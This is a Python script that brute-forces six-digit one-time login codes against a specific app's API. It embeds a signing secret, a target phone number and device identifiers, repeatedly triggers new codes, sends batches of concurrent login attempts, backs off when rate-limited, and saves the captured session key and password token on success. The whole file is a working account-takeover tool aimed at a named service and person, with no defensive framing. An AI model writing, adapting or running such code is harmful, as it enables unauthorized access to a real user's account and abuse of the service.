import asyncio
import aiohttp
import hashlib
import json
import time
from urllib.parse import quote

# Configuration
BASE_URL = "https://clubhtp.alaclub.in/api.php"
SECRET_KEY = "751a276cae97ac29e91819106ebb62f0"
APP_VER = "5.0.0"

PHONE_NUMBER = "7357580788"
OTP_SID = "88ceb0ce80f72a67556e02d2fd06cb13"
RESEND_OTP_INTERVAL = 240  

REQUESTS_PER_SECOND = 100
BATCH_SIZE = 100
DELAY_BETWEEN_BATCHES = 1.0  
RATE_LIMIT_SLEEP = 300

start_time_global = time.time()
total_requests_sent = 0

async def generate_sign(action, ver, sid, payload):
    sorted_keys = sorted(payload.keys())
    sorted_param_str = "".join([f"{k}={payload[k]}" for k in sorted_keys])
    raw_str = f"{action}{sid}{ver}{sorted_param_str}"
    sign_str = f"{raw_str}{sid}{SECRET_KEY}"
    return hashlib.md5(sign_str.encode("utf-8")).hexdigest()

async def send_async_request(session, action, sid, payload, otp_code=None):
    payload["ts"] = int(time.time())
    signature = await generate_sign(action, APP_VER, sid, payload)
    param_json = json.dumps(payload, separators=(",", ":"))
    encoded_param = quote(param_json)

    url = (
        f"{BASE_URL}?action={action}&ver={APP_VER}&sid={sid}"
        f"&language=0&sign={signature}&param={encoded_param}"
    )

    headers = {"User-Agent": "okhttp/3.12.1", "Host": "clubhtp.alaclub.in"}

    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
            raw_text = await response.text()
            try:
                data = json.loads(raw_text)
            except json.JSONDecodeError:
                data = {"ret": -998, "msg": "Invalid JSON", "raw": raw_text}
            return {"otp_code": otp_code, "response": data, "raw_response": raw_text}
    except Exception as e:
        return {"otp_code": otp_code, "response": {"ret": -999, "msg": f"Error: {str(e)}"}, "raw_response": str(e)}

async def send_otp_periodically(session):
    otp_payload = {
        "channel_id": "2025224", "pname": "aplus", "rver": "3.0.9",
        "tel_no": PHONE_NUMBER, "type": 100,
        "gaid": "782f2714-c560-4fb9-a5d2-be0bb525ad35", "phoneimei": "9e7c78a55282a19b",
    }
    first_run = True
    while True:
        if not first_run:
            print(f"\n[*] OTP Request ko 4 minute ({RESEND_OTP_INTERVAL} seconds) ke liye sleep kiya gaya hai...")
            await asyncio.sleep(RESEND_OTP_INTERVAL)
        otp_sent_successfully = False
        while not otp_sent_successfully:
            try:
                print("\n[*] Requesting OTP...")
                res = await send_async_request(session, "SignupCode", OTP_SID, otp_payload.copy())
                api_res = res.get("response", {})
                ret_code = api_res.get("ret")
                if ret_code == 0:
                    print(f"[+] OTP Sent Successfully! Response: {api_res}")
                    otp_sent_successfully = True
                    first_run = False
                else:
                    print(f"[-] OTP Failed to send! Server Msg: {api_res.get('msg')}")
                    await asyncio.sleep(5)
            except Exception as e:
                print(f"[-] Error sending OTP: {e}")
                await asyncio.sleep(5)

async def brute_force_otp():
    global start_time_global, total_requests_sent
    login_action = "SendLogin"
    target_number = PHONE_NUMBER 
    
    login_payload = {
        "tel_no": target_number, "code": "", "pwd": "", "logintype": 3, "cver": "1001",
        "cver_new": "1003", "rver": "3.0.9", "pname": "aplus", "channel_id": "2025224",
        "subchannel_id": 0, "m_brand": "vivo", "m_model": "V2338", "phonename": "V2338",
        "phonenos": "android", "os": "android", "screen_width": "2408", "screen_height": "1080",
        "phoneimei": "9e7c78a55282a19b", "gaid": "782f2714-c560-4fb9-a5d2-be0bb525ad35",
        "firebase_id": "c8fd33ba75a4a6bd440e3a763f7d740b", "net": "mobile", "vpn": 1,
        "crashmodel": 1, "uid": 0, "language": "en", "user_language": 0, "init_type": 0,
        "hasBigfun": 0, "pwdtoken": "", "pushid": "", "push_uid": "", "bdid": "",
        "appsflyer_id": "", "adjust_id": "", "third_info": "", "latitude": "",
        "longitude": "", "install": "", "os_device": "{}",
    }

    connector = aiohttp.TCPConnector(limit=BATCH_SIZE, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        print(f"[*] Starting Brute Force on {target_number}...")
        otp_background_task = asyncio.create_task(send_otp_periodically(session))
        rate_limit_count = 0
        tested_count = 0
        i = 0  # Starting OTP (VPS pe daalne se pehle isko 0 kar dena)
        
        try:
            while i < 1000000:
                tasks = []
                batch_start = i
                batch_end = min(i + BATCH_SIZE, 1000000)
                for j in range(batch_start, batch_end):
                    otp_code = f"{j:06d}"
                    login_payload["code"] = otp_code
                    task = asyncio.create_task(send_async_request(session, login_action, "0", login_payload.copy(), otp_code))
                    tasks.append(task)
                
                batch_start_time = time.time()
                results = await asyncio.gather(*tasks)
                batch_end_time = time.time()
                tasks = [] 
                rate_limit_hit = False
                
                for res in results:
                    tested_count += 1
                    total_requests_sent += 1
                    otp_used = res.get("otp_code")
                    api_res = res.get("response", {})
                    raw_server_res = res.get("raw_response", "")
                    
                    if api_res.get("ret") == 0:
                        print(f"\n\n[+] Login ho gaya hai. [✓] SUCCESS! OTP Found: {otp_used}")
                        try:
                            with open("Successful.txt", "a+") as f:
                                f.write(f"{target_number} | {raw_server_res}\n")
                        except Exception as e:
                            print(f"[!] Error writing to Successful.txt: {e}")
                        
                        try:
                            data = api_res.get('data', {})
                            uid = data.get('uid', 'N/A')
                            skey = data.get('skey', 'N/A')
                            pwdtoken = data.get('pwdtoken', 'N/A')
                            with open("success_result.txt", "w") as f:
                                f.write(f"OTP: {otp_used}\nUID: {uid}\nskey: {skey}\npwdToken: {pwdtoken}")
                        except Exception as e:
                            print(f"[!] Error while extracting credentials: {e}")
                        
                        total_time_taken = time.time() - start_time_global
                        await asyncio.sleep(1)
                        return 
                    
                    if api_res.get("ret") == -999 or "limit" in str(api_res.get("msg", "")).lower():
                        rate_limit_hit = True
                
                if rate_limit_hit:
                    rate_limit_count += 1
                    if rate_limit_count > 20: return
                    await asyncio.sleep(RATE_LIMIT_SLEEP)
                    continue
                
                i = batch_end
                batch_duration = batch_end_time - batch_start_time
                current_rps = BATCH_SIZE / (batch_duration + DELAY_BETWEEN_BATCHES) if batch_duration > 0 else 0
                time_for_1m_sec = 1000000 / current_rps if current_rps > 0 else 0
                hrs = int(time_for_1m_sec // 3600); mins = int((time_for_1m_sec % 3600) // 60); secs = int(time_for_1m_sec % 60)
                print(f"[*] Tested {tested_count} combinations | Speed: {current_rps:.1f} req/s | Est 1M: {hrs}h {mins}m {secs}s", end="\r")
                await asyncio.sleep(DELAY_BETWEEN_BATCHES)

        finally:
            otp_background_task.cancel()

if __name__ == "__main__":
    import os
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(brute_force_otp())